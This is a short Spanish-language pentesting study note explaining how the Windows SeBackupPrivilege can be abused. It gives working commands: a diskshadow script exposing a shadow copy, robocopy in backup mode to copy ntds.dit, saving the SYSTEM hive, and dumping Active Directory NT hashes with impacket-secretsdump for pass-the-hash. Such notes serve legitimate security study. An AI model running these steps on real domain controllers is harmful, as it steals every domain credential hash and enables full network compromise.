-----
- Tags: #teoria #practica #windows 
- -----
# SeBackupPrivilege 

El privilegio **SeBackupPrivilege** es uno de los muchos privilegios de seguridad que se puieden asignar a losu suarios o grupos en el sitema opertivo Windows. Este privilegio otorga a un usuario o servcio la capacidad de realizar copias de seguridad de archvios y directorios, **incluso si el usuario o servicio no tiene acceso explícito a esos recursos.**

-----
# Abuso 

Como sabemos, el privilegio **SeBackupPrivilege** nos permite realizar copias de seguridad de archivos a los cuales no tenemos acceso, lo cual puede ser interesante de cara a archivos que puedan existir y puedan ser privilegiados, pero incluso en un entorno de [[Active Directory]] esto puede ser aun más interesante ya que podríamos pensar en realizar un [[Pass The Hash]] volcando los hashes NT almacenados en la ruta **C:\Windows\NTDS\ntds.dit**. 

Existen múltiples maneras de abusar de este privilegio las cuales pueden ser vistas en la página web de [pentestlab](https://pentestlab.blog/tag/diskshadow/), pero en este caso haremos uso de **DiskShadow**.
#### Máquina víctima
```shell
# Creamos un archivo con el siguiente contenido: 
set context persistent nowriters 
add volume c: alias {name_to_alias} 
create 
expose %{name_to_alias}% z: 
# IMPORTANTE: AGREGAR UN ESPACIO AL FINAL DE CADA LÍNEA
```
Una vez subido a la máquina victima o creado el archivo con el contenido indicado, podríamos abuscar del **diskshadow.exe** para crear una unidad (En este caso la **z**) con el contenido indicado. 

```shell
diskshadow.exe /s C:\{path}\{to}\{file}\{uploaded}
```
De esta manera, se crea la **shadow copy** y se expone en la unidad **z**.

```shell
copy z:\Windows\NTDS\ntds.dit ntds.dit
# Intentamos crear la copia 
robocopy /b z:\Windows\NTDS\ . ntds.dit
# Si contamos con el privilegio SeBackupPrivilege es mejor hacer uso de robocopy
```
Una vez lograda la copia de seguridad, si la descargamos así como el archivo **system** también (`reg save HKLM\system system`) podríamos dumpear los hashes NT del Active Directory con **impacket-secretsdump** para realizar un [[Pass The Hash]]. 

